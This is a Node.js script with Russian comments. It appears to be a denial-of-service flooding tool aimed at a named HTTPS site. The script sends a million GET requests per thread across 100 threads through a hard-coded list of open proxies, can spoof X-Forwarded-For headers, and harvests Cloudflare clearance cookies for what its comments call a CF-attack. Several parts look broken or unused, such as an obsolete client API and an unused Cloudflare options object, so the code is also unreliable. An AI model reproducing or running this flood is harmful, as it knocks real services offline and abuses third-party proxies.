const http = require('http');
const https = require('https');
const request = require('sync-request');

const raw_sock = require('./HTTP-RAW.js');

// Настройки запроса
const target = "https://tls.mrrage.xyz";
const threads = 100;
const amountPerThread = 1000000;
const spoofIpHeader = false;

// Настройки Cloudflare
const cf_action = "aHR0cHM6Ly9mb28uY2xvdWRmbGFyZS5jb20v"; // base64-encoded URL (https://foo.cloudflare.com/)
const cf_cookieName = "__cfduid,cf_clearance"; // Cookie-имя для использования приложением 
const cf_evParams = {'t': target, 'u': target+'index.html'};
const cf_evName = "__cf_bm";

// Настройки прокси
const proxyList = [
    '103.149.130.38:80',
    '128.199.202.122:8080',
    '103.150.18.218:80',
    '16.163.88.228:80',
    '103.145.113.78:80',
    '103.156.141.100:80',
    '103.118.78.194:80',
    '68.183.53.101:9994',
    '103.149.146.252:80'
];

// Создаем RAW сокеты
raw_sock.createSockets(threads);

// parse url
const url = new URL(target);

// Параметры прокси
var proxy, agent;
(function nextProxy() {
    var proxyUrl = proxyList[Math.floor(Math.random() * proxyList.length)];
    console.log('Using proxy:', proxyUrl);
    var [proxyHost, proxyPort] = proxyUrl.split(':');
    agent = http.Agent({ keepAlive: true });
    proxy = http.createClient(proxyPort, proxyHost, agent);
})();

// Формируем хэдеры для HTTP/HTTPS-заголовков
const headers = {
  'Referer': target,
};

// Формируем хэдеры для CF-атаки
var fakeUserAgent = 'CFNetwork/1.0';
var cookie = getCookie(cf_cookieName);
var params = encodeUriParams(cf_evParams);
headers["User-Agent"] = fakeUserAgent;
headers["Cookie"] = cookie;
headers["Referer"] = url.protocol + '//' + url.hostname + '/';
headers['Connection'] = 'Keep-Alive';
headers['Content-Length'] = params.length;
headers['Accept-Encoding'] = 'gzip, deflate, br';
headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8';

// Формируем опции запроса для CF-атаки
var cf_options = {
    host: 'foo.cloudflare.com',
    path: '/cdn-cgi/l/chk_jschl',
    method: 'GET',
    headers: headers,
    agent: false
};

// Основной цикл отправки запросов
for(let i = 0; i < threads; i++){
  (function(i){
    setTimeout(function(){
      for(let j = 0; j < amountPerThread; j++) {
          if (spoofIpHeader) {
            headers["X-Forwarded-For"] = getRandomIPAddress();
          }

          var req = proxy.request({
              host: url.hostname,
              port: url.port,
              method: 'GET',
              path: url.pathname + url.search,
              headers: headers,
          });
          var resp = req.end();

          // Печать результатов
          console.log("Thread: "+(i+1)+", Request: "+(j+1)+", Status code: "+resp.statusCode);
      }
    }, 0);
  })(i);
}

// Получить случайный IP
function getRandomIPAddress() {
  let ip1 = Math.floor(Math.random() * 255) + 1;
  let ip2 = Math.floor(Math.random() * 255) + 1;
  let ip3 = Math.floor(Math.random() * 255) + 1;
  let ip4 = Math.floor(Math.random() * 255) + 1;
  return ip1+"."+ip2+"."+ip3+"."+ip4;
}

// Получить cookies
function getCookie(cookieName) {
  var cookies = request("GET", target).headers['set-cookie'];
  var cookieValue = '';
  for(var i=0; i<cookies.length; i++) {
    if(cookieName.indexOf(cookies[i].split(";")[0].split("=")[0]) !== -1){
      var val = cookies[i].split(";")[0].split("=")[1];
	  if(cookieValue === ''){
        cookieValue = val;
      } else {
        cookieValue += '; '+val;
      }
    }
  }
  return cookieValue;
}

// Encode URI parameters
function encodeUriParams(params) {
  var str = "";
  for (var key in params) {
      if (str !== "") { str += "&"; }
      str += key + "=" + encodeURIComponent(params[key]);
  }
  return str;
}